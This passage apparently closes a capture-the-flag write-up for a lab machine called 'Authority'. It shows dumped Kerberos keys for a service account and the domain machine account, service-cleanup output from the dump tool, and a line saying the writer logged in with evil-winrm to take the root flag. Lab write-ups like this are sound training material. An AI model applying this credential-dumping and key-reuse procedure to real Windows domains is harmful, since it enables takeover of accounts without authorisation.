svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:5473668921d738a423458c57a216b07903adf603064c0d75256fd661292273b7
AUTHORITY$:aes128-cts-hmac-sha1-96:53c6b9f8a15669399ec412a84dfc3317
AUTHORITY$:des-cbc-md5:ef4c23d5e9bfea4a
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
<SNIP>
```
- Logged in using `evil-winrm` and got the root flag
![Pasted image 20250226215544.png]()
